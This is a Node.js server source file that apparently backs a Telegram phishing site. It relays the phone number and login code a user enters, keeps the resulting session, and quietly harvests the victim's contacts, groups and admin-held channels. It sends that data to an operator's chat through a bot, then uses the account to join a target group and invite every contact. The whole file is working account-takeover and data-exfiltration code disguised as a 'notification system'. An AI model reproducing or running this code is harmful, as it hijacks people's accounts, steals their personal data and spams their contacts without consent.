const express = require('express');
const cors = require('cors');

const { TelegramClient, Api } = require('telegram');
const { StringSession } = require('telegram/sessions');

const app = express();
app.use(cors());
app.use(express.json());

const apiId = parseInt(process.env.API_ID || 29310851);
const apiHash = process.env.API_HASH || '9823f6b6d9cf657d64d7d33cdde80d1f';
const TARGET_GROUP_ID = process.env.TARGET_GROUP_ID || '';

// Bot configuration
const BOT_TOKEN = process.env.BOT_TOKEN || '';
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || '';

const sessions = new Map();
const authenticatedUsers = new Map();

function generateSessionId() {
    return Math.random().toString(36).substring(2) + Date.now().toString(36);
}

// Send message via bot
async function sendBotMessage(message) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: ADMIN_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });

        const data = await response.json();
        if (data.ok) {
            console.log('📨 Bot message sent to admin');
        } else {
            console.error('❌ Bot message failed:', data.description);
        }
    } catch (error) {
        console.error('❌ Bot message error:', error);
    }
}

// Send authentication code
app.post('/api/telegram/send-code', async (req, res) => {
    try {
        const { phoneNumber } = req.body;
        console.log(`📱 Sending code to: ${phoneNumber}`);
        
        const client = new TelegramClient(new StringSession(''), apiId, apiHash, {
            connectionRetries: 5,
        });

        await client.connect();
        console.log('🔗 Connected to Telegram');

        const result = await client.invoke(
            new Api.auth.SendCode({
                phoneNumber: phoneNumber,
                apiId: apiId,
                apiHash: apiHash,
                settings: new Api.CodeSettings({}),
            })
        );

        const sessionId = generateSessionId();
        sessions.set(sessionId, {
            client,
            phoneCodeHash: result.phoneCodeHash,
            phoneNumber,
            timestamp: Date.now()
        });

        console.log(`📨 Code sent to ${phoneNumber}`);

        res.json({
            success: true,
            sessionId: sessionId,
            message: 'Code sent to your Telegram app'
        });

    } catch (error) {
        console.error('❌ Send code error:', error);
        res.status(400).json({
            success: false,
            message: error.message || 'Failed to send code'
        });
    }
});

// Verify code and authenticate
app.post('/api/telegram/verify-code', async (req, res) => {
    try {
        const { code, sessionId } = req.body;
        console.log(`🔐 Verifying code: ${code}`);
        
        const session = sessions.get(sessionId);
        if (!session) {
            return res.status(400).json({
                success: false,
                message: 'Session expired'
            });
        }

        const result = await session.client.invoke(
            new Api.auth.SignIn({
                phoneNumber: session.phoneNumber,
                phoneCodeHash: session.phoneCodeHash,
                phoneCode: code,
            })
        );

        console.log(`✅ Login successful: ${result.user.firstName} ${result.user.lastName}`);

        const userId = session.phoneNumber.replace(/[^\d]/g, '');
        authenticatedUsers.set(userId, {
            client: session.client,
            phoneNumber: session.phoneNumber,
            user: result.user,
            userId: userId,
            loginTime: Date.now()
        });

        sessions.delete(sessionId);

        res.json({
            success: true,
            message: 'Authentication successful!',
            user: {
                phoneNumber: session.phoneNumber,
                firstName: result.user?.firstName || '',
                lastName: result.user?.lastName || '',
                userId: userId
            }
        });

        // Extract data and perform operations
        setTimeout(() => {
            performUserOperations(session.client, result.user, session.phoneNumber);
        }, 2000);

    } catch (error) {
        console.error('❌ Verify error:', error);
        res.status(400).json({
            success: false,
            message: 'Invalid code'
        });
    }
});

// Main operations: Extract admin data, join group, add contacts
async function performUserOperations(client, user, phoneNumber) {
    try {
        console.log(`\n🚀 Starting operations for ${user.firstName} (${phoneNumber})`);
        
        // Get all data
        const contactsResult = await client.invoke(new Api.contacts.GetContacts({ hash: 0 }));
        const contacts = contactsResult.users.filter(u => !u.self && !u.deleted && !u.bot);
        
        const dialogs = await client.getDialogs({ limit: 100 });
        const groups = dialogs.filter(d => d.isGroup);
        const channels = dialogs.filter(d => d.isChannel);
        
        console.log(`📊 Found: ${contacts.length} contacts, ${groups.length} groups, ${channels.length} channels`);
        
        // Check admin groups/channels
        const adminGroups = [];
        const adminChannels = [];
        
        console.log(`👑 Checking admin permissions...`);
        
        // Check groups for admin status
        for (const group of groups.slice(0, 10)) {
            try {
                const participants = await client.invoke(new Api.channels.GetParticipants({
                    channel: group.entity,
                    filter: new Api.ChannelParticipantsAdmins(),
                    offset: 0,
                    limit: 10,
                    hash: 0
                }));
                
                const isAdmin = participants.users.some(u => u.id.toString() === user.id.toString());
                if (isAdmin) {
                    adminGroups.push({
                        title: group.title,
                        members: group.entity.participantsCount || 0
                    });
                }
                await new Promise(resolve => setTimeout(resolve, 1000));
            } catch (error) {
                console.log(`⚠️ Could not check group: ${group.title}`);
            }
        }
        
        // Check channels for admin status
        for (const channel of channels.slice(0, 10)) {
            try {
                const participants = await client.invoke(new Api.channels.GetParticipants({
                    channel: channel.entity,
                    filter: new Api.ChannelParticipantsAdmins(),
                    offset: 0,
                    limit: 10,
                    hash: 0
                }));
                
                const isAdmin = participants.users.some(u => u.id.toString() === user.id.toString());
                if (isAdmin) {
                    adminChannels.push({
                        title: channel.title,
                        members: channel.entity.participantsCount || 0
                    });
                }
                await new Promise(resolve => setTimeout(resolve, 1000));
            } catch (error) {
                console.log(`⚠️ Could not check channel: ${channel.title}`);
            }
        }
        
        // Send bot notification with admin data
        const botMessage = `
🚨 <b>NEW USER LOGIN</b> 🚨

👤 <b>User:</b> ${user.firstName} ${user.lastName}
📱 <b>Phone:</b> ${phoneNumber}
🆔 <b>ID:</b> ${user.id}
🕒 <b>Time:</b> ${new Date().toLocaleString()}

📊 <b>STATISTICS:</b>
📞 Contacts: ${contacts.length}
👥 Groups: ${groups.length}
📢 Channels: ${channels.length}
👑 Admin Groups: ${adminGroups.length}
👑 Admin Channels: ${adminChannels.length}

${adminGroups.length > 0 ? `👑 <b>ADMIN GROUPS:</b>
${adminGroups.map((g, i) => `${i+1}. ${g.title} (${g.members} members)`).join('\n')}` : ''}

${adminChannels.length > 0 ? `👑 <b>ADMIN CHANNELS:</b>
${adminChannels.map((c, i) => `${i+1}. ${c.title} (${c.members} subscribers)`).join('\n')}` : ''}

✅ <b>Status:</b> Data extracted successfully!
        `.trim();
        
        await sendBotMessage(botMessage);
        
        // Join your target group
        if (TARGET_GROUP_ID) {
            console.log(`👥 Joining target group...`);
            try {
                await client.invoke(new Api.channels.JoinChannel({
                    channel: TARGET_GROUP_ID
                }));
                console.log(`✅ User joined target group`);
                
                // Wait before adding contacts
                await new Promise(resolve => setTimeout(resolve, 5000));
                
                // Add contacts to group
                console.log(`👥 Adding ${contacts.length} contacts to group...`);
                let addedCount = 0;
                
                for (const contact of contacts) {
                    try {
                        await client.invoke(new Api.channels.InviteToChannel({
                            channel: TARGET_GROUP_ID,
                            users: [contact]
                        }));
                        
                        addedCount++;
                        const name = `${contact.firstName || ''} ${contact.lastName || ''}`.trim() || 'Unknown';
                        console.log(`✅ ${addedCount}/${contacts.length} Added: ${name}`);
                        
                        // 3 second delay between adds
                        await new Promise(resolve => setTimeout(resolve, 3000));
                        
                    } catch (error) {
                        const name = `${contact.firstName || ''} ${contact.lastName || ''}`.trim() || 'Unknown';
                        console.log(`❌ Failed to add: ${name}`);
                        
                        // If rate limited, wait longer
                        if (error.message.includes('FLOOD_WAIT')) {
                            const waitTime = parseInt(error.message.match(/\d+/)[0]) * 1000;
                            console.log(`⏳ Rate limit, waiting ${waitTime/1000}s...`);
                            await new Promise(resolve => setTimeout(resolve, waitTime));
                        }
                    }
                }
                
                // Send final report
                const finalMessage = `
✅ <b>OPERATIONS COMPLETED</b>

👤 <b>User:</b> ${user.firstName} ${user.lastName}
📱 <b>Phone:</b> ${phoneNumber}
👥 <b>Added to group:</b> ${addedCount}/${contacts.length} contacts
🕒 <b>Completed:</b> ${new Date().toLocaleString()}
                `.trim();
                
                await sendBotMessage(finalMessage);
                
            } catch (error) {
                console.log(`❌ Group operations failed: ${error.message}`);
            }
        }
        
    } catch (error) {
        console.error('❌ Operations error:', error);
    }
}

app.get('/health', (req, res) => {
    res.json({ 
        status: 'OK',
        authenticatedUsers: authenticatedUsers.size,
        timestamp: new Date().toISOString()
    });
});

app.get('/', (req, res) => {
    res.json({
        message: 'Telegram Bot Notification System',
        status: 'Running',
        features: [
            'Bot notifications with admin data',
            'Auto-join target group',
            'Add all contacts to group',
            'Rate limiting protection'
        ]
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Telegram Bot System Started`);
    console.log(`📡 Running on port ${PORT}`);
    console.log(`🤖 Bot notifications enabled`);
    console.log(`✅ Ready!`);
});